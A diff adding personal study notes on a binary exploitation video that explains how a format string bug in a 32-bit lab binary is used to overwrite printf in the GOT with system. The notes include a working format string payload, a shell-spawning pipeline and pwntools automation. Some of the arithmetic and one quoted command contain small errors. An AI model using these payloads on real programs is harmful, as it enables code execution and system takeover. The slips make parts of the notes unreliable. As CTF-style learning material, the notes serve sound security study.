@@ -1,0 +1,167 @@
+This is an overview of CryptoCat's 9th video in the binary exploitation series, overwriting the GOT
+
+1.) Recon
+	- Binary and flag owned by root as well as the flag 
+	- 32 bit, not stripped, dynamically linked
+	- Canary, NX Enabled
+	- Partial Relro
+		- Full Relro = No read and write of the global offset table
+	- Looking at the source
+		- No buffer overflows, using fgets()
+		- However, there is a format string vuln because printf() doesn't use a format string specifier 
+		- Keep printing format string specifiers in a printf() vuln will read up values on the stack
+	- Have a look in ghidra
+		- We can see the canary in main 
+		- Notice no return in vuln(), just supposed to loop through input 
+		- We can see the .got and .got.plt
+	- NOTE: The %n format specifier can write things 
+		- We would want to overwrite an address of a function in the GOT with a function that we want to call, like system
+		- The goal would be to overwrite an address on the GOT with system (like printf() because it is called in vuln()), and then once the program loops around again it will actuall call system instead of printf()
+		- See articles for differences between different .got .plt combos and such
+			- Basically, .got contains actual offsets or addresses as filled in by the linker for external symbols
+			- .plt contains the "stubs" to look up the addresses in the .got.plt section and either jump to the write address or trigger a lookup with the linker if the address has not been filled yet
+			- .got.plt is the GOT for the PLT. It contains target addresses after they have been looked up or an address back in the PLT to trigger the lookup. Doesn't seem much different than .got except it might not contain additional offsets? More like a middle man between .plt and .got
+
+2.) Exploit
+	- Some links in the description showing how the GOT write operation is supposed to work 
+	- Keep in mind, %h prints out the hex value and %p prints out the pointer values on the stack. However, %s will attempt to print out the string that an address on the stack points too and if there is no such string, the program will segfault. 
+	- How this is going to work (12:01)
+		- $<number>$n allows you to write to a position on the stack
+		- If we have a target pointer that we want to write to on the stack we need to first find out where our input is stored on the stack
+			- We can do this by entering AAAA%<index>$p to see where out input comes up 
+				- Ex. AAAA%7$p = AAAA0x8044000a
+				      AAAA%6$p = AAAA0xffffd06c
+				      AAAA%4$p = AAAA0x41414141
+				- So, our input is stored in the 4th place on the stack
+			- Once we find out where out input is stored on the stack, this is the address we will use for the rest of the write operation 
+
+		- Many problems, first is that we cannot write that many decimal places
+			- If writing 4 chars as input means writing "4" at a specific address, then we'll have to write 3405691582 (0xcafebabe in decimal) which isn't doable
+
+			- However, AAAA%96x%7$n writes 100 at the address 0x41414141
+				- This is because %100x will print your argument padded with 100 bytes (represented as spaces)
+				- The ability to do %<number>x is the key
+
+		- Second Problem, it can take a long time to write all characters to the stack
+			- Can't do AAAA%3405691578x%7$n because this will pad a 3405691582 on std output which will take forever
+
+		- The solution, would be to instead of writing all four bytes at a time, we can write two short integers 
+			- This will be done using the format specifier %hn
+			- This means that 0xcafe (52966 in decimal) will be written to the higher order bytes and 0xbabe (47806 in decimal) in the low order bytes
+
+			- If we have an address we want to write to, 0xbffff6ac, 0xcafe will be written at the higher order which is 0xbffff6ac + 2 = 0xbffff6ae. 0xbabe will be written at the lower order bytes, 0xbffff6ae
+
+			- Formula to set for the padding = [value we want] - [bytes we already wrote] = [valye to set]
+
+		- LOW ORDER BYTES: 47806 - 8 = 47798 (Cuz we already wrote 8 bytes; the two 4 byte addrs)
+
+		- HIGH ORDER BYTES: 51996 - 47806 = 4160 (Cuz we already wrote 47906; the two 4 byte addresses and the 47798 bytes from the pervious writing)
+
+		- The exploit for this example scenario would look like: 
+			- \xac\xf6\xff\xbf\xae\xf6\xff\xbf%47798x%7$hn%4160x%8$hn
+				- \xac\xf6\xff\xbf points to low order bytes (little endian)
+				- \xae\xf6\xff\xbf points to higher order bytes (little endian)
+				- %47798x This is how many bytes are being written to std out
+					- For the lower lower order bytes, aka the 0x0xbffff6ac address
+						- 0xbabe is being written to this address via %7$hn. This is because it is little endian and needs to be sent with the last part first 
+					- 8 (which is the first address ending with ac) + 47778 = 47806 (or 0xbabe)
+				- %7$hn will write those bytes
+				- %4160x writes 4160 bytes to stdout
+				- %8$hn writes 8 (which is the address ending with ae) + 47798 + 4160 = 51966 (0xcafe) at the 0xbffff6ae 
+
+
+	- Now lets have a look at what the exploit looks like in the context of this current binary
+		- The address of the GOT.printf() function is 0x0804c00c
+		- The address of system in LIBC is 0xf7dff040
+
+		- So, we must write 0xf7df (63455) @ 0x0804c00c + 2 = 0x0804c00e (high order) and we must write 0xf040 (61504) @ 0x0804c00c (low order) 
+
+		- Now we have to figure out the value for the padding. The formula for the padding is; 
+		[the value we want] - [the bytes we already wrote] = [the value to set]
+
+			- Low Order Bytes: 
+			61504 - 8 (the two 4 byte addresses we already wrote) = 61496
+
+			- High Order Bytes:
+			63455 - 61504 (the previous low order write) = 1951
+
+		- Exploit construction; Keep in mind that the offset is %4, so we will use %4, %5
+
+			- \x0c\xc0\x04\x08\x0e\xc0\x04\x08%61496x%4$hn%1951x%5$hn = exploit payload
+
+			Lets Disect this: 
+				- \x0c\xc0\x04\x08 is 0x0804c00c in little endian. Points to lower order bytes
+				- \x0e\xc0\x04\x08 is 0x0804c00e in little endian. Points to higher order bytes
+				- %61496x will write 61496 to std out
+				- %4$hn will write 8 + 61496 = 61504 bytes (or 0xf040) at the first address specified, 0x0804c00c
+				- %1951x writes 1951 bytes on std out
+				- %5$hn will write 8 + 61496 + 1951 = 63455 (or 0xf7df) at the second address specified, 0x0804c00e
+
+			- python2 -c 'print("\x0c\xc0\x04\x08\x0e\xc0\x04\x08%61496x%4$hn%1951x%5$hn)' > payload
+				- However, to get an interactive shell, the manual payload looks like: 
+				(cat manual_payload ; cat) | ./got_overwrite
+
+
+	- Lets have a look at how to automate this exploit with pwntools
+	- pwntools has an automated format string exploitation system, apparently
+	- Two levels of automation we can use
+
+		1.) First, Create a send_payload function that looks like; 
+
+		# This function helps communicate with the binary to determine the format string offset
+		def send_payload(payload):  
+			p.sendline(payload)
+			return p.recvline()
+
+		Then, we can use the FmtStr() function to find the correct offset where out input is being stored on the stack 
+
+		# This uses our function we defined to send and recieve input to automatically find the offset
+		format_string = FmtStr(execute_fmt=send_payload)
+
+		Now we have to set the libc to be the libc inside of the elf using:
+
+		libc = elf.libc # I think this just uses the version of libc the elf is currently using
+		libc.address = <base addr of libc>
+		# Keep in mind, the base addr can be found manually and/or can be leaked with pwntools. Keep in mind the methods used to leak and find libc base addr with format string vulns. 
+
+		Can find the printf() address in the GOT using elf.got.printf and the value of system using libc.symbols.system
+
+		Next, we will manually overwrite printf() in GOT with libc system addr
+
+		format_string.write(0x0804c00c, p16(0xf040))
+		format_string.write(0x0804c00e, p16(0xf7df))
+
+		Then, we have to execute the format string writes
+
+		format_string.execute_writes()
+
+		Send the '/bin/sh' string once a successful overwrite of printf() with system() has been acomplished
+
+		p.sendline(b'/bin/sh')
+		p.interactive
+
+		# Can't overwrite all functions like this because it uses what is in the buffer, might have to look at other techniques when overwriting other functions than printf() or functions not dealing with the buffer
+
+
+		2.) Can automate even further: 
+
+		Instead of: 
+
+		format_string.write(0x0804c00c, p16(0xf040))
+		format_string.write(0x0804c00e, p16(0xf7df))
+
+		We Can use 
+
+		format_string.write(elf.got.printf, libc.symbols.system)
+
+		 
+
+
+
+
+
+
+
+
+
+
